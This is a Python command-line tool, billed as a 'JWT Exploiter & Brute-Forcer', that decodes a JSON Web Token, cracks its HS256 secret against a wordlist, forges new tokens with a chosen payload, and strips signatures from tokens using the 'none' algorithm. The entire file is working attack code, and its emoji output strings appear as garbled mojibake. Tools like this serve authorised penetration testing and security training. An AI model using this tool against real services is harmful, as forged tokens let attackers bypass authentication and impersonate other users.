import jwt
import sys
import argparse
import base64
import json
from jwt.exceptions import InvalidSignatureError, DecodeError

def decode_jwt(token):
    try:
        header_b64, payload_b64, _ = token.split(".")
        header = json.loads(base64.urlsafe_b64decode(add_padding(header_b64)))
        payload = json.loads(base64.urlsafe_b64decode(add_padding(payload_b64)))
        print(f"\nğŸ“œ Header:\n{json.dumps(header, indent=4)}")
        print(f"\nğŸ“¦ Payload:\n{json.dumps(payload, indent=4)}")
        return header
    except Exception as e:
        print(f"[âŒ] Failed to decode JWT: {e}")
        sys.exit(1)

def add_padding(b64string):
    return b64string + "=" * (-len(b64string) % 4)

def brute_force_secret(token, wordlist_path, verbose=False):
    print("\nğŸ§¨ Brute-forcing secret using wordlist...\n")
    with open(wordlist_path, "r", encoding='utf-8') as f:
        secrets = [line.strip() for line in f]

    for secret in secrets:
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            print(f"ğŸ¯ Secret key found: '{secret}'")
            return secret
        except InvalidSignatureError:
            if verbose:
                print(f"[-] Tried: {secret}")
        except DecodeError:
            continue
    print("[âŒ] Secret not found in wordlist.")
    return None

def forge_token(original_token, secret, new_payload, new_alg="HS256"):
    header = {"alg": new_alg, "typ": "JWT"}
    forged = jwt.encode(new_payload, secret, algorithm=new_alg, headers=header)
    print(f"\nğŸ› ï¸ Forged Token:\n{forged}")
    return forged

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ğŸ” Pro-level JWT Exploiter & Brute-Forcer")
    parser.add_argument("token", help="JWT token")
    parser.add_argument("--wordlist", help="Path to wordlist for brute-forcing")
    parser.add_argument("--forge", action="store_true", help="Forge a new token after finding the key")
    parser.add_argument("--new_payload", help="JSON string payload for the new token")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    header = decode_jwt(args.token)

    if header["alg"] == "none":
        print("\nâš ï¸ Algorithm is 'none'. You may be able to forge without signing.")
        forged = args.token.rsplit(".", 1)[0] + "."
        print(f"ğŸ› ï¸ Forged token: {forged}")
        sys.exit(0)

    if header["alg"] != "HS256":
        print(f"\nâš ï¸ Algorithm is {header['alg']}. Only HS256 brute-forcing supported.")
        sys.exit(0)

    if args.wordlist:
        secret = brute_force_secret(args.token, args.wordlist, args.verbose)
        if secret and args.forge and args.new_payload:
            try:
                new_payload = json.loads(args.new_payload)
                forge_token(args.token, secret, new_payload)
            except json.JSONDecodeError:
                print("[âŒ] Invalid JSON string for payload.")
    else:
        print("â„¹ï¸ No wordlist provided. Only decoded the token.")
